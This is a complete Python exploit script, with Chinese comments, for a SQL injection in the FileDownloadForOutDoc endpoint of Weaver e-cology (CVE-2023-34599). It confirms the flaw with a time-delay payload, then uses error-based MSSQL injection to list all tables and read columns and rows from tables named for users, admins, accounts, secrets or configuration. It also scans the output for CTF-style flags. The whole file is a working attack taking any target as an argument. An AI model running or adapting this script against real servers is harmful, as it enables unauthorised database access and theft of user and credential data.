#!/usr/bin/env python3
"""泛微 e-cology FileDownloadForOutDoc 前台 SQL 注入（CVE-2023-34599）利用脚本。

流程：WAITFOR 时间盲注检测 → MSSQL 报错注入一次性拉全部表名/列名 →
读敏感表数据（flag 关键词优先），证据写 stdout + -o 文件。

用法：weaver_sqli.py <target> [outfile]
参考：izzz0/E-Cology9.0-SQL-POC（检测思路）+ 公开报错注入 exp
"""
import re
import sys
import time

import requests
import urllib3

urllib3.disable_warnings()

FLAG_RE = re.compile(r"(?:flag|ctf|hf)\{?[A-Za-z0-9_\-]{6,64}\}?", re.I)


def req(session, base, payload, timeout=15):
    """POST /weaver/weaver.file.FileDownloadForOutDoc，fileid 注入点。"""
    url = base.rstrip("/") + "/weaver/weaver.file.FileDownloadForOutDoc"
    data = f"fileid={payload}&isFromOutImg=1"
    return session.post(url, data=data, timeout=timeout, verify=False,
                        headers={"Content-Type": "application/x-www-form-urlencoded",
                                 "User-Agent": "Mozilla/5.0"})


def detect(session, base):
    """WAITFOR 延迟 4 秒；耗时达标即存在注入。"""
    t0 = time.time()
    try:
        r = req(session, base, "1+WAITFOR+DELAY+'0:0:4'", timeout=12)
        el = time.time() - t0
    except requests.RequestException:
        return False, 0.0, ""
    return el >= 4.0, el, r.text[:300]


def error_extract(session, base, subquery, timeout=15):
    """CONVERT(int, ...) 报错回显：500 页面含转换失败的数据值。"""
    r = req(session, base,
            f"1+AND+1=CONVERT(int,({subquery}))", timeout=timeout)
    m = re.search(r"value\s*['\"]([^'\"]+)['\"]", r.text, re.I)
    if m:
        return m.group(1)
    # 兼容其他报错格式：把 500 页面中的长字符串直接捞出
    m2 = re.search(r"(?:failed|error)[^\n]{0,80}['\"]([^'\"]{2,200})['\"]",
                   r.text, re.I)
    return (m2.group(1) if m2 else "")


def main():
    target = sys.argv[1] if len(sys.argv) > 1 else ""
    outfile = sys.argv[2] if len(sys.argv) > 2 else ""
    if not target:
        print("usage: weaver_sqli.py <target> [outfile]")
        sys.exit(2)
    base = target if target.startswith("http") else "http://" + target
    sess = requests.Session()

    ok, el, body = detect(sess, base)
    print(f"[*] target: {base}")
    print(f"[*] delay={el:.1f}s vuln={ok}")
    if not ok:
        print("[-] no time-based injection (or WAITFOR blocked)")
        sys.exit(0)

    # 1) 一次性拉全部表名（FOR XML PATH 拼接）
    tables = error_extract(
        sess, base,
        "SELECT+STUFF((SELECT+','+name+FROM+sys.tables+FOR+XML+PATH('')),1,1,'')")
    print(f"[+] tables: {tables[:1500]}")
    flag_hits = FLAG_RE.findall(tables + " " + body)
    for f in flag_hits:
        print("FLAG", f)

    # 2) 对 flag/sensitive 关键词表枚举列并读数据
    candidates = re.findall(r"[A-Za-z_][A-Za-z0-9_]{1,40}", tables or "")
    keywords = ("flag", "user", "admin", "member", "account", "secret",
                "config", "sys", "hrm")
    seen = set()
    deadline = time.time() + 60
    for t in candidates[:40]:
        if time.time() > deadline:
            break
        if t.lower() in seen or not any(k in t.lower() for k in keywords):
            continue
        seen.add(t.lower())
        cols = error_extract(
            sess, base,
            f"SELECT+STUFF((SELECT+','+COLUMN_NAME+FROM+"
            f"information_schema.columns+WHERE+TABLE_NAME='{t}'+"
            f"FOR+XML+PATH('')),1,1,'')")
        if not cols:
            continue
        print(f"[*] {t} cols: {cols[:400]}")
        # 读前几行数据（报错注入一次一条，时间盒内读 3 条）
        for i in range(3):
            if time.time() > deadline:
                break
            row = error_extract(
                sess, base,
                f"SELECT+TOP+1+({cols.split(',')[0]})+FROM+[{t}]+"
                f"WHERE+1=1+FOR+XML+PATH('')")
            if row:
                print(f"[+] {t} data: {row[:400]}")
                for f in FLAG_RE.findall(row):
                    print("FLAG", f)
            else:
                break
    print("[*] done")


if __name__ == "__main__":
    main()
